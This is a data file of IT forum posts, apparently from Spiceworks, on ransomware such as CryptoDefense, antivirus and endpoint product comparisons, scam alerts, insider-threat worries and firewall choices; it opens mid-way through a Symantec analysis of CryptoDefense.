private key was only ever found on servers controlled by the attacker,meaning the attackers always maintained control over the encryption/decryptionkeys. On investigating how CryptoDefense implemented its encryption, weobserved that the attackers had overlooked one important detail: where theprivate key was stored.As advertised by the malware authors in the ransomdemand, the files were encrypted with an RSA-2048 key generated on the victim’scomputer. This was done using Microsoft’s own cryptographic infrastructure andWindows APIs to perform the key generation before sending it back in plain textto the attacker’s server. However, using this method means that the decryptionkey the attackers are holding for ransom, actually still remains on theinfected computer after transmission to the attackers server.When using Microsoft’s cryptographis infrastructure,private keys are stored in the following location:%UserProfile%\Application Data\Microsoft\Crypto\RSADue to the attackers poor implementation of thecryptographic functionality they have, quite literally, left their hostages akey to escape. Further details of Microsoft’s key storage architecture can befound here.EarningsSymantec is aware of the following Bitcoin addresses being used inCryptoDefense ransom demands:1EmLLj8peW292zR2VvumYPPa9wLcK4CPK1 (Firsttransaction March 18, 2014)19DyWHtgLgDKgEeoKjfpCJJ9WU8SQ3gr27 (Firsttransaction February 28, 2014)The first known Bitcoin transaction for these addresseswas on February 28, 2014. This corresponds with the first detection of aCryptoDefense sample by Symantec. At this time, based on the number of receivedtransactions for both Bitcoin addresses, Symantec can estimate that thecybercriminals behind CryptoDefense have earned over $34,000 in just one month.Prevalence Symantec telemetry shows that we have blocked over 11,000 unique CryptoDefenseinfections in over 100 countries. The United States makes up the majority ofthese detections followed by the United Kingdom, Canada, Australia, Japan,India, Italy, and the Netherlands.Figure 5. Heatmap for CryptoDefensedetectionsProtection Although not related, such were the similarities seen between CrytoDefense andCryptolocker that Symantec initially detected this threat asTrojan.Cryptolocker along with numerous other detections.

1967231,Cisco AMP for endpoint - Opinions?,"Hi guys,I'm currently trialing Cisco AMP for endpoints along with some other products. Sophos Central endpoint + intercept x being one of them.Initial thoughts on Cisco AMP for endpoints, not that impressed. After cutting through all the marketing hype, it's basically a signature based AV solution but with the backing of a large cloud based signatures to reference from.Clicked on a zero-day type phising email, downloaded the initial .js file. Ran it and if i disabled the offline tetra engine and have it running based on cloud signatures, it couldn't detect or quarantine the malware payload that was downloaded. When i enabled the offline tetra engine, it was better as it was able to quarantine the payload. Initially it couldn't because the malware was pretty new but two days later it did quarantine it. I also manually uploaded the initial zip file that contained the .js file to their sandbox and even after it returned a high threatscore (95/100), it still didn't retrospectively quarantine the original zip file and retrospective quarantine was one of the biggest selling points of the product. One thing i liked, the forensic data that i got when it finally caught a malicious file, very detailed and great info but besides that, quite disapointed with the POC. I'm waiting for the Cisco sales rep to give me some explanation and possible let me know if i did anything wrong. It also didn't pass any of the exploit and ransim tests which again is disappointing.Compared this with interceptX, that same zero day threat, it was able to block an exploit attempt which i assume was what the js file payload was trying to do. A couple days later, ran the same file, the malware got blocked so i assume that the endpoint AV protection is blocking it now that the AV signatures have been updated.  It also passed all the exploit and ransim tests.Again, anyone of you guys had experience Cisco AMP for endpoints? I really want to like it but it's not looking good so far",0

We went through the typical process of runnign diagnostics on the agent in question, and sending the reports over to support for analysis. This is all fine and dandy, until i got an email stating that this agent was in a policy group that did not have the VNC applications added to the ""Allowed Threats"" list. Odd...I had added these last night, verified this morning shortly before contacting support, and whilst chatting with support, but now it is apparent that these have simply disappeared. Not only that, these disappeared from the other 3 policy groups as well. Upon further review, it appears that ALL of my policies have been reset to default configurations. My question is, has anyone else had anything of this nature occur? Do you think support has some sort of backdoor tshooting access, and the tech is simply attempting to play the dumb card by saying ""I am not exactly sure as well""? Needless to say i'm a bit distraught that my agents are now running scans during business hours, negatively affecting productivity, and all the agent has to say is ""The agent logs doesn't show if there were changes made on the policy.

2151238,"Scam Alert: Sophisticated webcam ""sextortion"" campaign","This scam involves what some are calling a ""sextortion"" campaign. (Note: this has also been discussed on Spiceworks here and here)The scam involves an email threatening the recipient. The threat? That the bad actors will release a video of the victim watching pr0n to all their contacts, unless of course a payment is made. They're even saying that they will release this in the form of a split screen video, with the X-rated content and the user's reactions to it (via webcam) at the same time. Ouch. (Keep those webcams protected!) All that being said, Avast's research so far indicates that these claims are false, and all part of the sophisticated scam.What makes this scam so potent, says Avast Security Evangelist Luis Corrons, is that the criminals are also providing a real user password in the threatening email, lending an air of legitimacy to it all. Users are led to think that yes, because the perp has their password, they could have accomplished the nefarious recordings.Sadly, passwords are easily bought and sold on the dark web and in fact are a bustling business, making it trivial in some cases for criminals to obtain this information for use in scam campaigns like this.This threat may also be coming from multiple factions and in multiple languages and variations.Things to watch out for:The email mentions both a webcam and secret video recording. There is a request for money — to be sent in bitcoin. It includes a real (usually older) password that you have used. It usually includes a scare tactic that includes a threat to send the video recording to your contacts.Read the full details on this threat in the Avast security blog, and stay safe my friends.",12

363584,"How many infections are ""normal""?","With all of the ""Which AV is best"" threads, I have realized something:People seem to consider that having computers get infected and need to be cleaned manually or reimaged is a completely normal thing. They treat it like it's a fact of life. We breathe. We eat. We sleep. We reimage infected computers.  I really boggle at this because with my current AV solution, I haven't had to manually remove a single infection or reimage an infected machine.This isn't here to crow about my AV solution though. Mainly, I want to know:How many infections a month do you have to clean or reimage despite your enterprise AV solution? Name names if you like, give background factors that impact things (users are local admins, for example), etc.To answer my own question for my experience recently:195 seats locally is what I will focus on. Users are local admins because management overrides common sense.Symantec averaged 12-18 persistent infections per month that had to be cleaned manually or reimaged.Sophos replaced SEP and the median dropped to 3-4/month with the occasional outbreaks that took Sophos a few weeks to a month to respond to.Current AV - 0 per month, in 1.5 years had one infection around for 20 minutes before I made a phone call for five minutes and the AV removed it 15 minutes later on its own.I'm so used to the zero now and I always wonder whether the 12-18 was high or the 3-4 was normal or whether zero out of hundreds is normal and I have nothing to be happy about with my new AV since that's standard.So how many infections do you end up dealing with per month? ",0

We are looking for a folder encryption solution.While TrueCrypt is a wonderful program, mounting the encrypted ""volume"" (i.e. folder) isn't viable for our users as it would change the folder structure on their Outlook and various other programs that point to C:\ .Changing the folder structure isn't really a viable option. So, we are looking for encryption options that 1) don't use volumes, 2) provide 256-bit or better encryption, 3) allow for specific folders to be encrypted (rather than entire drives).Most of our users are on Win 7, but some still have Vista and XP. Due to not having Enterprise or Ultimate, BitLocker and EFS by Microsoft have also been ruled out as alternatives. Suggestions are most welcome. Thanks in advance. ",5
1299004,Stopping the lanmanserver service with FSRM/File Screens,"Hello,Among several other layers of security, I have a File Screen setup in FSRM with particular file names to alert me if those file names are written to a shared folder in the event that a ransomware infection gets through (example of a file name is DECRYPT_INSTRUCTION.*). Right now, the only thing the screen does it send me an email that the file has been written to the specified directory. I would also like the file screen to stop the server service (lanmanserver). I have tried a few different things (just pointing to cmd.exe and then including the arguments ""net stop lanmanserver"" but the issue I am having is that Windows requires elevated privileges to stop services. I tried the same thing with powershell but the same situation is true - admin privileges required. If I run my scripts as administrator it works fine, but I can't see where I can do that within the file screen properties (I have tried all levels of ""Command security"" already). I know how to do this with Task Scheduler, but I don't seem to have the same flexibility with FSRM:Any suggestions?Thanks!David",0

549829,Cyber Shakedowns: A Hacker's New Payday,"Hey Spicegang.... I'm always on the lookout for the latest info that can help you at work and out in the world.  Here's the latest from our Security Insight team.  Check it:Cyber Shakedowns: A Hacker's New Payday﻿Hearing a story about an organized crime ring demanding protection money from businesses might conjure images of the local mafia taking money from neighborhood businesses. However, in today’s global internet economy, extortion is no longer confined to the mafia, or even brick-and-mortar stores – businesses now face online extortion tactics from cybercriminals. The idea behind the shakedown hasn’t changed, it’s just moved into the cyber realm. These days, instead of threatening physical harm, cybercriminals threaten data loss or exposure, or to harm a brand’s reputation or operations.As attackers consider the economics of what they do, they recognize extortion as the fastest way for them to make money. For a hacker, extortion is an easy way to monetize stolen information and provides the shortest path from cybercrime to cash. Moreover, cybercriminals don’t actually have to perpetrate an attack for it to pay off, they can simply capitalize on threatening to attack.To exact a profit from these threats, attackers use a variety of extortion tactics. Let’s take a look at some of the common methods:RansomwareThe threat of cyber extortion has grown with the rise of ransomware, sophisticated forms of malware that are designed to hold victims’ data hostage. Attackers attempt to infiltrate a computer with traditional phishing methods and once a user opens the file, the malware locks the user out of computer files and demands money to unlock them.Initial versions like RansomLock locked the computer until the user paid the ransom to get into the machine. More advanced versions have since appeared, including CryptoLocker and CryptoDefense, which encrypt the information on the computer and then require payment for the files to be decrypted. For instance, CryptoDefense automatically encrypts all files and demands a $500 ransom payout that rises to $1,000 if unpaid. The malware then destroys the key and files if no ransom is paid within one month.DDoS AttacksOver the past decade distributed denial of service attacks (DDoS) have become a preferred weapon for both web extortion and hacktivist attacks. In these kinds of attacks, hackers flood websites of businesses with large amounts of traffic that overwhelms servers and knocks out service. Cybercriminals will demand a fee either before or during the attack to cease the attack.High-revenue generating internet companies are especially attractive to attackers because their entire business relies on internet connectivity. With armies of botnets, cybercriminals can easily halt businesses’ revenue streams. Recent victims of such attacks include internet companies like Vimeo, Evernote, Meetup and Feedly.Data Hostage SituationsData is the lifeblood for many companies in the digital age, this gives hackers a lot of leverage once they have access to it. Once they breach a company network, cybercriminals will use a plethora of methods to coerce a company into payment, including:Stealing the most recent backup and threatening to wipe the original version from the corporate servers.Changing the encryption key within a database and holding the new key hostage.Stealing protected or personal data and threatening the breached company with disclosure of the information.Obtaining corporate or government secrets and threatening to sell them.Threatening to expose private corporate or personal information that can compromise the company, employees or a public figure.Finding company network vulnerabilities and threatening to disclose them to other hackers.Social and Reputation ThreatsRecently, a number of small businesses reported receiving “Notice of Extortion” letters in the U.S. mail, which demand payment of one bitcoin (currently USD $630) to avoid negative publicity, vandalism and harassment. According to Krebs on Security, these letters threaten businesses with negative online reviews, complaints to the Better Business Bureau, harassing telephone calls, telephone denial-of-service attacks, bomb threats, fraudulent delivery orders, vandalism, and even reports of mercury contamination.Although the future of these types of attacks remains to be seen, extortion attacks appear to be increasing with the growth of cryptocurrencies like Bitcoin. This universal, anonymous and relatively untraceable payment method serves an enabling function for cyberattacks. Hackers, who often live half a world away from their victims, don’t have to think in terms of one currency, making extortion transactions easier.So what do you do if a cybercriminal is trying to extort money out of you or your company?While it may be tempting to pay off attackers to make the problem go away, most experts agree that it’s best to avoid negotiating with or paying off attackers. Anyone who is trying to extort money from your business isn’t honest or trustworthy, and payment does not guarantee the protection of your business’ data or reputation. If your company is targeted by an extortion attack, notify the authorities. Government agencies have resources at their disposal that can help connect the dots behind extortion attacks. For example with DDoS attacks, they can engage a forensics team to perform research into the botnet that’s being leveraged in order to find the controller to try to shut it down.Before cybercriminals attempt to strike, it’s important to be vigilant about protecting your business against malware and security breaches. For the best possible protection, Symantec customers should ensure that they are using a layered approach to securing their environment, utilizing the latest Symantec technologies incorporated into our consumer and enterprise solutions.﻿﻿And now you are up to the minute!  As always, if you like this type of post, let me know.  I only want to get stuff out here that is useful to you.EXCELSIOR!",11

1513102,Old IndentiCard System - Keep or Scrap?,"We just inherited a building with around 10 magnetic doors / gates all tied back to an old Identicard system.  Every door / gate (at least in the offices) has some type of key card reader.  At the moment we are trying to decide if we want to keep it or rip it out completely.There are 3 of the 9000 controller boxes in the telco room from what I can find, and they are connected in series with the last connected to the converter box shown here.  It looks like the previous tenant had the 9-pin female cable you see below connected to some kind of server.I would guess they would be using the software outlined in this document - http://www.timesaverid.com/IDentiPASS%20LT%20Operations%20Manual.pdf.﻿As you can see, this system is...old.  It still works and has a couple of buttons under a reception desk in the lobby that can open the doors to each hallway and out to the shops.  The magnetic doors / gates are mainly tied to the office areas only (not really tied to the giant manufacturing shop behind the offices).  The manufacturing shop will be dedicated to Welding, Painting / Powder Coating, Assembly, and the movement of parts out to our customers.  We're security the exterior shop doors with keys and will probably use the existing security system from Stanley Security.  The office staff will be mostly Sales, Estimating, possibly Engineering, and Quality Assurance.We probably will not have servers at this location but have the option since there is a nice server room with a couple of 2-post racks already installed.We were asked to do some research on the id card system, but it is not required for us to occupy and use the facility and its offices.If it were up to you, would you keep the system and try to use it or just rip it out?  My guess is if I were to call Indenticard they would want to sell me a system upgrade.  I don't know if we could just try to obtain the software that controls the system, get a station with a 9-pin connector and an OS that would run the software, etc.  That could be a completely wasted effort for something we don't necessarily need.I'm leaning toward just having the doors disconnected so the magnets will no longer be active.  If we want to explore it later we certainly can.  But I would appreciate any feedback from fellow Spiceheads.",11

422939,How to Suddenly Block One Domain Device from Internet Access?,"We have an issue where an unknown computer hogs our 2Mb/s internet bandwidth and we need to immediately block it. This is a Windows Domain with 2008R2 servers, about 70 varying computers & devices, and a Cisco 1721 Router as internet gateway. Internet use is monitored with NTOP and we can see the offending computer's name, ip & mac address. But sometimes we don't know the machine's user or location, and can't quickly stop it.Can you suggest an extra device that allows quick blocking, by mac or ip address? A free software firewall on a dedicated computer, or a hardware security appliance, that would be passing & monitoring all traffic between the Cisco router & the LAN.We don't have a lot of router expertise. Our router person says it is hard to suddenly block one ip address, because to avoid a reboot, we have to replace an entire section in the run config so that the command is near the top and executed in the correct order. From the router CLI it's the last command and preceeding commands allow it through anyway. (something like that).We are a non-profit in a remote location (thus the low bandwidth) in a remote country. Budget is a big issue.I've done some research but its a large field and not my one and we are overdue to handle this. A proxy-cache server would be an added bonus. Smoothwall? Untangle? ClearOS?

Should I only have trusted sites at a low level and put Internet and Intranet Zones back to default?2. In what situations do I need to set the Intranet security Zone?3.

Among the initiative's proposals are pronounced changes to current legislation concerning cybersecurity threat intelligence sharing. More than partisan disagreement, however, the initiative has met resistance from many members of the tech industry.But one new critic from the Open Web Application Security Project (OWASP) has a different plan. In an open letter, Jim Manico, a global board member for OWASP, claims that, though the ""task of efficiently building an managing secure software is daunting, [...] it is not hopeless,"" and he has a plan. The caveat: Manico needs $4 billion to move forward.  In short, Manico's plan is to ""hire a large team of security-minded developers and assessment professionals to focus on providing security services for the most popular open source software framework,"" thereby giving software developers the right tools to build a secure software infrastructure. This would be done, he claims, in a fashion similar to Google's Project Zero, which pays bug hunters to find critical vulnerabilities in software from companies such as Microsoft and Apple. And it would segue into the next step: Building ""new software security frameworks and tools."" And for the low, low price of $4 billion, the Internet of tomorrow would be secure. Right? But does Manico's plan pass the IT test? How would IT secure the Internet? ",12

358886,"I need a good 1Gbps UTM, does anyone know of such a thing?","I have a client that has upgraded their WAN connection from 1.5 Mbps DSL to 100Mbps cable. For unrelated reasons, we had to replace our IBM UTM firewall, and went with a Cisco Sa540. In comparison, the SA540 is practically useless. It runs with 80% memory used nearly at all times and often pegs the CPU. This results in the Internet being so slow that it is literally unusable on most afternoons. Even when it does run well, I am only getting 50Mbps download speed. When I test without the SA540, I get 100M consistently.This is of course after I have greatly reduces the filtering levels of the SA540 in order to keep the speed usable as much as possible (it was worse before, if you can believe that). I have worked with Cisco tech support, updated firmware, adjusted settings, reset to default and reconfigured from scratch, and all to no avail.In addition to this, the SA540 misses practically all internet based attacks on our network. I have been so busy cleaning up malware that it is often diffuclt to do much else. I have entertained the Idea of an Untangle appliance because I have several deployments of that UTM under my belt, and it reduces malware to a rare occurance. I cannot use Untangle here because, I cannot seem to get past 50Mbps download speeds, even running on a well powered computer.We currently have 40 users on the network and expect to grow. We are planning our next major IT upgrades to carry us for the next 5 years, and are entertaining the idea of 1Gbps fiber.  Given how much emphasis there is on WAN speeds these days as more things move to the cloud, I suspect I should be thinking in terms of 10Gbps, but I seriously doubt there will be a UTM for that, or that I can know what type of network interfaces would be used.Does anyone know of a UTM that can deliver 1Gbps speeds with all filtering enabled. One that also IS EFFECTIVE at filtering malware, and intrusion attempts to our servers. We have HTTP, Exchange, and FTP all hosted directly from our LAN. ",0

186011,The Antivirus Industry’s Dirty Little Secret,"The Antivirus industry has a dirty little secret that they really don’t want anyone to know. Despite their claims, their products are not all that effective. Many of them are only protecting against at best 80% or 90% of the threats out there in the wild at any time.Let’s look at that a bit more in detail. AV products need to protect against two general types of threats: ones that are known and threats that are unknown. The ones that are known, they have a signature for so that they can detect the threat and get rid of it. This is called reactive detection. Then, there are threats that are still unknown, usually new, fresh threats created by the bad guys. AV products need to protect against those in a proactive way, and antivirus software can be scored looking at how many of those new threats they block.This type of scoring on both reactive and proactive detection is actually being done by the antivirus industry’s premier site for insiders: Virus Bulletin. They have created so called RAP averages. RAP stands for “Reactive And Proactive”. They test all antivirus products every few months, and measure how each product does in both reactive and proactive detections of a large amount of threats. And they create a graph where these scores are plotted for all products. The proactive score is on the X-axis, and the reactive score is on the Y-axis.The results are far from pretty. One well known, major antivirus industry player is routinely scoring no better than 75% reactive combined with a 70% proactive. And people wonder how come PCs still get infected by malware. Check out the test results why!http://www.knowbe4.com/resources/antivirus-industry-dirty-little-secret/",0
2085949,Comodo ITSM vs compromised / counterfeit Android,"Comodo is selling licenses for Comodo ONE Enterprise, whichuses Comodo IT and Security Management; ITSM for short. During ourinvestigation period, I asked for some test licenses to evaluate our interest in moving from Comodo's old ESM to thenewer ITSM. One of the benefits of ITSM is support for mobile device protection.I had an idea... Can Comodo's mobile solutiondeal with an Android device that is compromised at the firmware level? It's no secret that counterfeit cell phones from overseas can contain trojans and malware, yet it’s unrealistic to expect all your end-users to be capable of identifying a counterfeit cell phone. Ina BYOD environment, this is a pretty realistic scenario. I do not expect Comodo to be able to win against a subvertedAndroid device, but that isn’t going to stop me from seeing just how far ComodoITSM can go.:: The test setup ::A counterfeit Samsung Galaxy S6, no SIM card, using only Wi-Fifor connectivityMonitoring/logging all traffic to/from the counterfeit device.A license for ITSM.My source for the counterfeit was a local Metro PCS store owner. He had comeacross some of these counterfeits that users had brought in and traded during somepast promotions. They were worthless to him, so he had no qualms with providing one.:: Steps taken ::Factory reset the counterfeit Samsung phone.Connect to our monitored Wi-FiInstalled the ITSM client from ComodoEnrolled the device to ITSMThe device was enrolled on November 8th at 14:55.Right off the bat ITSM gives me a clue that something is off: A serial number of “0123456789ABCDEF”.Screenshot:Let’s assume I didn’t notice the serial number, or justdismissed it as a software error. Next I opened the web browser app on the counterfeit. I observe acascade of traffic and software starts loading itself up on the phone. Snort clearly reports trojan CNC traffic from the counterfeit: I refreshed my ITSM page and saw a new notification on my ITSM dashboard: Malware was detected on the android device at November 08 201715:28.So it took around 8 minutes for Comodo to report thatsomething was amiss. Not bad.I click on the link and find myself in a subsection of theAntivirus dashboard. At this point I am presented with an opportunity to tryand remove the malware. I give it a whirl. After doing this, I didn’t see much else. Even after letting things run for some time, the dashboard never reported back if the removal was successful. After letting this sit for a while I sent the command to run a full AVscan on the Android. After it finished, I opened up the ITSM application (on the Android) and it reported anapplication that should be removed. It appeared to walk me through the removalprocess, but could not actually remove the software. Screenshots: I checked the dashboard again to find that the same malwareappeared from the scan. At this point I sent the command to delete the malwareagain. Once I gave it sufficient time, I ran another full AV scan. Comodo stilldetected the same malware. Asexpected, this malware is here to stay.:: Conclusion ::Understandably, Comodo could not eliminate the malware. Evenso, I believe ITSM gave sufficient information for a technician to identify this as a counterfeitAndroid device. All things considered, it's noteworthy that this platform could lead to a cleaner BYOD business environment.Other thoughts:I cannot justify the expense of licensing every mobile device that uses company assets. I know Android and iOS developers aren't cheap, but If Comodo dared to offer matched (or, heaven forbid, unlimited)licenses for Android mobile devices for all Comodo One Enterprise customers, ITSM may gain significant traction. After all, what IT professional doesn't want to say for certain all their employees endpoints are covered? I was not able to locate or secure a counterfeit iPhone. I would hazard to guess the results of this test would be similar. ::: Update from Comodo :::An employee at Comodo sent me an email about this:OurMDM is free for as many devices as you have. What you would be paying for isthe security portion.  For example, if you have 100 End Points,you would pay for your 100 EP licenses. That’s it. Once you have that license you canadd as many mobile devices as you care to manage.  ",0

I don't think a switch could be pulled off in 62 days the way things move in Corporate America so we may be able to add 1 year for Sophos. I generally like Microsoft so I don't want to push blindly for Sophos just because I really like them.So can anyone speak to the comparison of these products?Most important obviously is how well Forefront protects. I know Sophos has never let us down.Second is how easy is it to get help from Microsoft if you need help with a virus, a setting or just Administration help. Again Sophos has been very easy to reach and very willing to help.Lastly (not necessarily least) How easy is it to Administer?

1925242,Best Home Defense for Ransomware,"Hi all,I provide IT services for my father-in-law. He has a one-man home design business, and only uses 1 computer for all of his work. Last year he was infected with ransomware. He had next to nothing for backups and as a result lost almost everything. I've tried to stress to him the importance of regular backups, and he's been better, but still not good enough.Just last week he was infected with ransomware again (opened a zip-file from an email that appeared to be from a client). This time his most recent backup was from July, so though he didn't lose everything this time, it still hurt him pretty bad.Obviously, the best defense for this is BACKUPS. So here's what I'm thinking for him: Veeam endpoint backup, configured to trigger the backup when he plugs in his USB drive and then auto-eject it when finished. Hopefully I can get him to remember to at least plug it in more often this way.I'm wondering if he should use a cloud backup solution as well, though I'm not sure he will pay for this.As for AV, he was using Mcafee at the time (against my recommendation). While I was cleaning up the computer this time I disabled Mcafee for kicks and re-enabled Windows Defender (He's on Windows 10), and it detected the malware immediately.So, my questions:1. What are you all using for home solutions to best defend against ransomware? 2. Should I bother getting him a paid AV, or something free like Sophos, or just stick with Windows Defender?3. Any recommendations for inexpensive cloud backup solutions? He does have Office 365 with 1 TB OneDrive storage, but of course this gets infected too, so isn't much good for this purpose.4. Any ideas on how to make his physical USB backups any more automated then I'm planning on doing with Veeam? It's difficult because you obviously don't want to leave the drive connected all the time, or that ends up being pointless.Thanks in advance for any feedback.",0

1953114,Camera for external users,"Hello,I've been asked to help set up a camera that will be used for our employees to show external users things happening inside our company. So basically, both internal employees as well as external users need to be able to view the video camera stream simultaneously.We could do some port forwarding and expose an IP camera to the Internet, but I don't like that idea since those devices are usually not very secured. Similarly, we could have the user connect to our VPN, but that would let them access our internal network, which also isn't a desirable solution.So what I'm thinking would be best is some kind of cloud-connected camera. That way, the users won't be accessing our network, but everyone will be able to view the stream if they log in.Talking with the employee who requested this, we determined that the camera doesn't need to be PTZ or anything fancy - just a good quality picture in a relatively mobile piece of hardware so it can be re-positioned relatively easily. The camera must connect through Wi-Fi since there will not be any hardwired connections available near the camera.Do you have any hardware that you'd recommend that matches these requirements?",0

2186617,How to secure LAN from potential internal threats?,"Good morning Spiceheads!I am hoping you will be able to provide some suggestions and guidance. I apologize up front if this is a little long but context is important, I feel. We are an MSP with a variety of internal system/network admins providing varying levels of support to clients locally and remotely. I am also just recently tasked with starting to maintain and monitor our internal network. We have some very creative and innovative admins who excel and identifying problems at client sites and resolving them appropriately.The Problem:We now have 1 admin who is becoming a little unhinged (UA = unhinged admin). UA has openly admitted to scanning our network, browsing file shares and viewing files on other internal user's computers, as well as saying that they were able to previously obtain domain administrator credentials for our network by keylogging the guy who was in my position before me. UA even noted that the domain admin password (which they should NOT have as regular admins don't have any real manageability to our network) has changed recently (I changed it when moving into the role for security) meaning that they have recently tried to use it. Other comments have been made towards potential exploitable and vulnerable items on our network.My ask:I am reasonably familiar with our network, and have started to identify security concerns, improvements etc. as part of my rapid adjustment to this role. I've reported UA with screenshots to our senior mgmt, but they and I agree that pushing UA too hard including up to possible termination could result in malicious acts performed against us / our network. I need to secure us before we act. It is impossible to know for sure what systems UA has access to currently / previously. On our network UA's account is a basic Domain User, but since their tenure here exceeds my own by nearly a decade I cannot say for sure what other accounts they may have. I've started changing passwords where possible and trying to identify ""browsable"" systems, but would love reasonable action options to secure our Windows/ESXi-based network without breaking functionality to the rest of staff. To further complicate the matter slightly, UA works from a small satellite office that has a site-to-site VPN with our head office. I also do not know if anyone else at the remote office is sympathetic to UA (he always plays the victim). Thank you in advance, and I'm sorry for the length and the general ""desperation"" feel to this post. ",0

2043679,Security vulnerabilities in the world of medical IoT,"I'm beginning to wonder if the list of devices that are ""hackable"" will ever end; I certainly didn't expect to hear any news about a pacemaker ending up on it. This was discussed in last week's Snap, and the Parallax did an interesting deep dive into the story with even more details.I must admit that I was not overly familiar with current pacemaker technology, and consider myself and my family very fortunate for that to be the case. It's not the same for everyone, who may themselves need a pacemaker device to live a healthy life, or have a friend or family member who does.This news impacts over 465,000 recipients of a certain model of RF-enabled pacemaker, which was found to contain security vulnerabilities. Specifically, that using ""commercially available equipment,"" an unauthorized user could modify the commands sent to a patient's pacemaker, resulting in rapid battery drain or improper pacing as some examples. (There was some drama surrounding the discovery of this exploit which is described in further detail in the blog.)Another staggering statistic -- researchers Billy Rios and Johnathan Butts discovered more than 8,000 (eight thousand!) vulnerabilities across four different pacemaker programming systems from four manufacturers. To me, the big takeaway is the impact to those who truly need this technology. While no breaches have been reported, it chips away at the trust people have in these life-saving devices -- and exposes the potential for harm if a nefarious party chose to take action. It's news like this that makes IoT security in the medical space so imperative; having someone remotely click my lights on and off is one thing; altering pacemaker programming is another.https://www.the-parallax.com/2017/09/01/pacemaker-recall-hacking-coordination/",11
1905009,Sophos UTM Application Control Skiplist not working?,"Hi guys,I'm trying to get this sorted out and not getting anywhere with Sophos' india based support.So, I have an Application Control rule to block Streaming Media category for Any source. This includes Adobe Flash. I have then gone to Advanced tab and added the website in question as a DNS host in the list of Skip Hosts/Nets. The website remains blocked. I found the URL for the actual swf file and it is on the same DNS host. Going to that URL directly says it is a blocked application.Sounds like to me this is what is happening: The application control rule to block streaming media for All is taking precedence - because we're skipping the website, sure, but the source network is still blocked anyways so it doesn't matter.If that is indeed the case, this would then mean I would have to make a rule to Allow Adobe Flash for Any and put it higher than the Block rule for Streaming Media. This would then open Adobe Flash to any site on the internet, not just navistarlearning.com. Just doesn't make sense to me.Any ideas? Thanks!!",11

There are 8 slots, 7 used for backup tapes and the 8th used for a cleaning tape.Attempted fixes: Turning off the autoloader and the server and rebooting. Attempted different commands to load other tapes. From Symantec, it is not possible to inventory or erase tapes so the software somehow knows there's something wrong. It also recognizes a tape is missing from a slot (the one loaded). A tape was attempting to load and got stuck.

2134433,GDPR Sticks and Carrots: 5 Reasons Why It Won’t Kill You,"Most media coverage of the GDPR focuses on the multimillion-dollar fines businesses can face if they fail to properly protect regulated data. Vendors and suppliers play the same fear card to boost sales of their products and services.While the price of non-compliance can indeed be steep, concentrating exclusively on the punitive side of the GDPR neglects the very real benefits of compliance. Taking steps to comply with the GDPR can also help you make your business more efficient, secure and competitive, driving new business opportunities. Let’s take a look at some of the GDPR carrots that are ignored in all the fear-mongering about its sticks.Benefit #1. Enhanced cybersecurityThe GDPR can prompt you to establish security-conscious workflows, which will help you avoid costly data breaches and data loss. The legislation requires organizations to adopt administrative and technical measures to protect the personal data of EU citizens in particular — but it’s nearly impossible to ensure the integrity and security of only that data and leave the rest of your IT environment out of scope. In fact, the regulation encourages you to reevaluate and improve your overall cybersecurity strategy. By establishing control over the entire IT infrastructure, building healthier data protection workflows and streamlining security monitoring, you can reduce your attack surface, better understand what is going on across your network, and detect and respond to cyber attacks faster and more efficiently.Benefit #2. Improved data managementTo comply with the GDPR, you need to know precisely what regulated information you have. But having a clear understanding of what sensitive data you store is valuable for more than just compliance — it will also help you refine your data collection policies, optimize your storage and improve your data management processes.First, you will be able to prune out ROT — redundant, obsolete and trivial files that have no business value. Getting rid of this data will slash storage and processing costs. And if any of this ROT is sensitive data, such as former customers’ personal information, you’ll also reduce risk; why continue to take responsibility for data that no longer has value to you?Second, you’ll be better positioned to reorganize your data storage and index the data to make it easily searchable. This will help you comply with the GDPR’s “right to be forgotten” by enabling you to find and delete all the personal data for a given individual. And it will make your staff more productive and efficient in their everyday tasks, since they’ll be able to quickly find the data they need.Benefit #3. Increased marketing ROIThe GDPR requires organizations get a subject’s consent to process their personal data. By implementing an opt-in policy to comply with this requirement, and purging ROT like lost or unengaged leads, you will transform your bloated database into a lean, fine-tuned source of highly relevant leads and customers who genuinely want to hear from you.With this information at hand, you will be able to tailor your message to the specific needs and habits of a clearly defined audience that has high interest in your brand. This granular marketing approach will result in higher click-through and conversion rates and more social sharing, and increase your marketing ROI because your budgets and efforts will be spent wisely.Benefit #4. More loyalty and trustGDPR compliance can support your aspiration to build more trusting relationships with both customers and the public at large. When gathering consent to use a subject’s data, you will have to explain clearly and concisely how you will be using that data. Since consumers are becoming more concerned about how their data is handled, the transparency and responsibility you demonstrate will encourage trust in your brand. In other words, achieving GDPR compliance enables you to demonstrate that you care about the privacy of your customers and stand head and shoulders above your competitors.Benefit #5. Leadership in establishing a new business cultureMany organizations today gain market share by being animal-friendly, eco-friendly or LGBT-friendly. Why not become privacy-friendly?The GDPR is a promising first step towards a new business culture of respecting and securing the sensitive data of customers. This mindset could well become the norm, just as separating food waste from plastic or recycling old bulbs have become standard practices. By adhering to the GDPR, you will be a leader in cultivating the values of data security in your employees and nurturing social responsibility in business.While there’s no denying that complying with the GDPR is hard work, it’s time to look forward to the benefits compliance will bring. Enhancing the security and privacy of sensitive data will help you avoid data breaches, improve employee productivity, run more effective marketing campaigns, build trust with customers and stand out from your competition. The GDPR is your opportunity to excel.",12

2147600,Barracuda vs Meraki - firewall,"Comparing a Barracuda F18 vs Meraki MX84 for an upcoming project. We've been replacing all client Cisco ASAs with Barracuda F18s this last year. Their price for features is really enticing. I've dropped in and configured a lot of Meraki gear in the past (various switches and WAPs), except firewalls. Expensive, and a never ending licensing model. Clients are perfectly fine with that. I have a highly scalable client that I've been assessing Meraki with Barracuda. Long term goals will likely be cloud systems, but for the next few years everything is on premises. This is also a client that will pay a lot more for better support/features/hardware/automation/etc.The reason for Meraki is central management. This client is spread across many states. I've been fortunate in the past to see their MSP setup; it's amazing and I might like to get back to it.My question is this... Anyone actually implemented both Barracuda and Meraki, and found any ""gotchas"" from either, aside from cost or never-ending licensing (lapsing causes loss of functionality)?",5

